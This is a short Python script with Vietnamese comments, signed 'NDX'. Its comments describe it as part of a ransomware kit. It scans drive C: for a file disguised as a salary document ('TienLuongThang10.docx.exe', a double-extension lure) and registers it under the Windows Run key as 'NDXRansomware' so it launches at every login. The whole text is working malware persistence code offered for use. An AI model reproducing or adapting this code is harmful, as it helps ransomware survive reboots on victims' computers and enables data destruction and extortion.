import winreg as reg
import os

# Version 2.0
# Made by NDX

def find_file_in_directory(directory, filename):
    """Tìm tệp theo tên trong thư mục cho trước."""
    for root, dirs, files in os.walk(directory):
        if filename in files:
            return os.path.join(root, filename)
    return None

def add_to_registry(name, path):
    """Thêm tệp vào Registry để tự động chạy."""
    try:
        key = reg.OpenKey(reg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run", 0, reg.KEY_SET_VALUE)
        reg.SetValueEx(key, name, 0, reg.REG_SZ, path)
        reg.CloseKey(key)
        print(f"{name} đã được thêm vào Registry để tự động chạy.")
    except Exception as e:
        print(f"Có lỗi xảy ra: {e}")

# Đặt tên tệp ransomware cần tìm
filename = "TienLuongThang10.docx.exe"  # Tên tệp ransomware

# Quét toàn bộ ổ đĩa C:
file_path = find_file_in_directory("C:\\", filename)
if file_path:
    add_to_registry("NDXRansomware", file_path)
else:
    print(f"Tệp {filename} không được tìm thấy trên ổ đĩa C.")